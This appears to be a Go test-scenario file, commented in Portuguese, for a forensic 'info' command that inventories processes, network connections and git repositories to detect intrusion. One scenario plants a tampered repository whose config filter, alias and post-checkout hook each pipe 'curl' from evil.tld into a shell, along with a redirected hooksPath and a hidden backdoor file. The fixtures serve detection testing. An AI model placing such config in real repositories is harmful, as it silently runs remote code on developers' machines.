package scenario

// O comando `info` — a pergunta que vem ANTES do veredito.
//
// Ele não conclui nada, então não tem achado a afirmar: o contrato dele é o
// TEXTO. Por isso estes cenários usam ExpectOutput, e por isso o harness precisa
// tratá-los como o `preserve` — não há linha de cobertura porque não houve
// varredura.
//
//	I1  o censo, com o teto e o padrão nomeados
//	I2  o dossiê de um processo cujo nome mente
//	I3  o censo de REDE, com o leque de saída nomeado
//	I4  a varredura de PORTAS, que entrava com o rótulo benigno de "pool"
//	I5  o censo de um repositório ADULTERADO — config que executa, histórico
//	    reescrito, e o que sumiu do `git status`

func init() {
	Register(Scenario{
		ID:     "I1-censo-com-teto-e-padrao",
		Desc:   "trinta cópias do mesmo comando sob um usuário: o censo conta as tarefas, compara com o teto e NOMEIA a repetição",
		Images: []string{"debian:12"},
		Cmd:    "info",
		Args:   []string{"process"},
		// Trinta cópias do MESMO comando, com o mesmo usuário. É a forma que o
		// caso real trouxe — 400 delas —, no tamanho que cabe num contêiner.
		Plant: `useradd -u 1500 -M -s /bin/sh app 2>/dev/null || true
			i=0
			while [ $i -lt 30 ]; do
				su app -s /bin/sh -c '/helper sleep 300' &
				i=$((i + 1))
			done
			sleep 1`,
		Caps: []string{"SYS_PTRACE"},
		ExpectOutput: []string{
			"CENSO",
			"tarefas (processos + threads)",
			// O nome, e não o número: é o nome que o operador digitou no comando
			// que falhou.
			"app",
			// A contagem por executável REAL — o que separa trinta cópias de um
			// implante de trinta cópias de um serviço.
			"por executável REAL",
			"/helper",
			// E a frase que o `ps` não dá.
			"PADRÃO RECONHECIDO",
		},
		Exit: 0,
	})

	Register(Scenario{
		ID:     "I2-dossie-de-processo-que-mente",
		Desc:   "o dossiê de um processo cujo argv se diz thread de kernel: as três identidades lado a lado",
		Images: []string{"debian:12"},
		Cmd:    "info",
		// O PID é descoberto no plantio e chega pelo shell, que é o mesmo
		// mecanismo dos cenários de preserve.
		Plant: `/helper argv0 "[kworker/0:9]" /helper sleep 300 &
			sleep 0.5
			echo $! > /tmp/pid`,
		Args: []string{"process", "$(cat /tmp/pid)"},
		ExpectOutput: []string{
			"IDENTIDADE",
			// As três: o que o kernel diz, e os dois que o processo escolhe.
			"executável",
			"argv[0]",
			"[kworker/0:9]",
			// E a leitura que o operador precisa: elas não batem.
			"divergência",
			"o exe é o que o kernel diz",
			// O passo seguinte já vem preenchido com o pid.
			"preserve --out",
		},
		Exit: 0,
	})

	Register(Scenario{
		ID:   "I3-censo-de-rede-com-leque",
		Desc: "um processo abrindo conexão para dez endereços na MESMA porta: o censo agrupa por executável e NOMEIA o leque",
		// A forma de varredura e de movimento lateral. Numa saída de `ss` são
		// dez linhas idênticas exceto pelo IP, e a forma some no meio delas.
		//
		// Os destinos são aliases de loopback: 127.0.0.0/8 inteiro chega no
		// mesmo listener, e é assim que se planta destinos DISTINTOS dentro de
		// um contêiner sem rede de mentira.
		Images: []string{"debian:12"},
		Cmd:    "info",
		Args:   []string{"net"},
		Plant: `/helper listen 0.0.0.0:22 &
			sleep 0.3
			/helper connect 127.0.0.2:22 127.0.0.3:22 127.0.0.4:22 127.0.0.5:22 \
				127.0.0.6:22 127.0.0.7:22 127.0.0.8:22 127.0.0.9:22 \
				127.0.0.10:22 127.0.0.11:22 &
			sleep 1`,
		ExpectOutput: []string{
			"CENSO DE REDE",
			// A escuta, com o bind — que é o que decide se é superfície.
			"ESCUTANDO",
			"fora de loopback",
			// O agrupamento por executável: dez conexões são UMA linha.
			"por executável, e não por conexão",
			"/helper",
			// E a frase que nenhum `ss` dá.
			"PADRÃO RECONHECIDO",
			"LEQUE DE SAÍDA",
			"10 endereços na porta 22",
			"movimento lateral",
			"SSH",
		},
		// O censo não conclui nada: não há achado, e portanto não há exit != 0.
		Exit: 0,
	})

	Register(Scenario{
		ID:   "I4-varredura-de-portas-nao-eh-pool",
		Desc: "um processo abrindo dezesseis PORTAS do mesmo host: é varredura, e entrava como pool de conexão",
		// A forma transposta do leque, e a que um scanner produz. Ela era
		// rotulada como "pool — a forma normal de cliente de banco", porque a
		// condição do pool olhava só o número de ENDEREÇOS distintos e
		// dezesseis portas do mesmo host somam um endereço.
		//
		// O defeito apareceu rodando um scan de portas contra o próprio
		// loopback e lendo a saída — não numa revisão de código.
		Images: []string{"debian:12"},
		Cmd:    "info",
		Args:   []string{"net"},
		Plant: `for p in 1521 2375 3306 3389 5432 5601 5900 6379 7001 8080 9200 9300 11211 15672 27017 8443; do
				/helper listen 127.0.0.1:$p &
			done
			sleep 0.5
			/helper connect 127.0.0.1:1521 127.0.0.1:2375 127.0.0.1:3306 \
				127.0.0.1:3389 127.0.0.1:5432 127.0.0.1:5601 127.0.0.1:5900 \
				127.0.0.1:6379 127.0.0.1:7001 127.0.0.1:8080 127.0.0.1:9200 \
				127.0.0.1:9300 127.0.0.1:11211 127.0.0.1:15672 127.0.0.1:27017 \
				127.0.0.1:8443 &
			sleep 1`,
		ExpectOutput: []string{
			"VARREDURA DE PORTAS",
			"16 portas distintas",
			"cliente legítimo fala com duas ou três portas de um host",
			// As portas alcançadas dizem o que a varredura procurava.
			"3306",
			"27017",
		},
		// E o rótulo benigno NÃO pode sair: era ele o defeito.
		ForbidOutput: []string{"POOL"},
		Exit:         0,
	})

	Register(Scenario{
		ID:   "I5-repositorio-adulterado",
		Desc: "backdoor commitado com --amend, hooks redirecionados e config que executa: o que a revisão de código não vê",
		// O caso que originou o comando: invasor acrescenta backdoor, faz
		// `--amend` para o commit revisado virar outro, e deixa a execução na
		// CONFIG — que não é commitada, não aparece em diff, e sobrevive a
		// `git pull`.
		//
		// Nada aqui é lido com `git`: tudo sai de arquivo, porque o git do host
		// pode ser o implante. Por isso o plantio escreve os arquivos à mão em
		// vez de chamar `git config`.
		Images: []string{"debian:12"},
		Cmd:    "info",
		Args:   []string{"git", "/srv/app"},
		Plant: `mkdir -p /srv/app/.git/logs /srv/app/.git/info /srv/fora
			printf 'ref: refs/heads/main\n' > /srv/app/.git/HEAD
			cat > /srv/app/.git/config <<'FIM'
[core]
	hooksPath = /srv/fora
	fsmonitor = /tmp/.x/watch
[remote "origin"]
	url = git@github.com:empresa/app.git
[filter "limpa"]
	smudge = curl -s http://evil.tld/p | sh
[alias]
	st = "!sh -c 'curl -s http://evil.tld/b | sh'"
FIM
			printf '* filter=limpa\n' > /srv/app/.gitattributes
			printf '/backdoor.py\n' > /srv/app/.git/info/exclude
			printf '#!/bin/sh\ncurl -s http://evil.tld/x | sh\n' > /srv/fora/post-checkout
			chmod +x /srv/fora/post-checkout
			printf 'carga' > /srv/app/.git/.cache.bin
			printf '%s %s invasor <i@evil.tld> 1755524332 +0000\tcommit: inicial\n' \
				0000000000000000000000000000000000000000 aaaa000000000000000000000000000000000000 \
				> /srv/app/.git/logs/HEAD
			printf '%s %s invasor <i@evil.tld> 1755524399 +0000\tcommit (amend): fix typo\n' \
				aaaa000000000000000000000000000000000000 bbbb000000000000000000000000000000000000 \
				>> /srv/app/.git/logs/HEAD`,
		ExpectOutput: []string{
			"CENSO DE REPOSITÓRIO",
			// quem rodou o git — o autor do commit é campo livre, isto não é
			"QUEM MOVEU REF AQUI",
			"invasor <i@evil.tld>",
			// a config como superfície de execução
			"O QUE ESTE REPOSITÓRIO EXECUTA",
			"core.hookspath", "core.fsmonitor", "filter.limpa.smudge", "alias.st",
			// o hook que não está onde se procura
			"REDIRECIONADO por core.hooksPath",
			// o amend, com o sha que devolve o que foi apagado
			"HISTÓRICO REESCRITO",
			"git cat-file -p aaaa",
			// e os esconderijos
			"ARQUIVO ESTRANHO DENTRO DO .GIT",
			"ESCONDIDO DO GIT STATUS",
			"/backdoor.py",
		},
		// O censo não conclui: não há achado, e portanto não há exit != 0.
		Exit: 0,
	})
}
